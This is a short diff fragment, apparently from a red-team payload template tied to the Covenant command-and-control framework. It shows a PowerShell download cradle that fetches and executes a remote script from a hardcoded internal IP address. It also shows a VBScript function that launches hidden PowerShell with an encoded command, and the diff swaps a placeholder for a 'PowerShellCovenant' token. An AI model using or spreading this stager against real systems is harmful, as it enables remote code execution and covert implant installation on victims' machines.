@@ -35,7 +35,7 @@ $str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-
   Function DoStuff()
     Dim wsh
     Set wsh = CreateObject("Wscript.Shell")
-    wsh.run "powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>"
+    wsh.run "powershell -Sta -Nop -Window Hidden -EncodedCommand PowerShellCovenant"
     Set wsh = Nothing
   End Function
 
